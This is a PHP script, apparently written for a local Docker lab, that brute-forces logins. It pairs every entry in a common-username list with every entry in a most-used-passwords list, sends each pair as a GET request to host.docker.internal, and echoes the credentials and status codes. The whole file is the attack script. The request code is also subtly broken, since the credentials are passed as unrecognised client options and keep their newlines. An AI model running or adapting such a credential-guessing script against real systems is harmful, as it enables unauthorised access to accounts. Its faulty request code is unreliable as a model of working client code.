<?php

use GuzzleHttp\Client as Guzzle;

require_once __DIR__ . '/../vendor/autoload.php';

$client = new Guzzle(['base_uri' => 'http://host.docker.internal:80']);

function getUsernames($file) {
    $handle = fopen($file, 'r');
    while (!feof($handle)) {
        yield fgets($handle);
    }
    fclose($handle);
}

function getPasswords($file) {
    $handle = fopen($file, 'r');
    while (!feof($handle)) {
        yield fgets($handle);
    }
    fclose($handle);
}

foreach (getUsernames('top-usernames-shortlist.txt') as $username) {
    foreach (getPasswords('2020-200_most_used_passwords.txt') as $password) {
        echo 'DEBUG => username: ' . $username . ' - password: ' . $password;
        $response = $client->request('GET', '/', [
            'username' => $username,
            'password' => $password
        ]);
        echo "status: {$response->getStatusCode()} <br>";
    }
}

$memory_used = memory_get_usage();
$memory_used_mb = round($memory_used / (1024 * 1024), 2);
echo "Total memory used: " . $memory_used_mb . "MB\n";


